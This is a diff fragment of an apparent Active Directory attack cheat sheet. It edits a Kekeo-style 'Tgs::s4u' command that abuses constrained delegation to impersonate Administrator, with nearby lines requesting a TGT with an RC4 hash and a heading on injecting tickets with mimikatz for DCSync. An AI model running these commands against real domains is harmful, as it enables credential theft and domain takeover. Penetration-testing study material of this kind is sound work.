@@ -549,7 +549,7 @@ Tgt::ask /user:dcorp-adminsrv$ /domain:<DOMAIN> /rc4:<HAHS>
 #### Requesting TGS
 No validation for the SPN specified
 ```
-Tgs::s4u /tgt:<kirbi file> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
+Tgs::s4u /tgt:<kirbi file> /user:Administrator /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
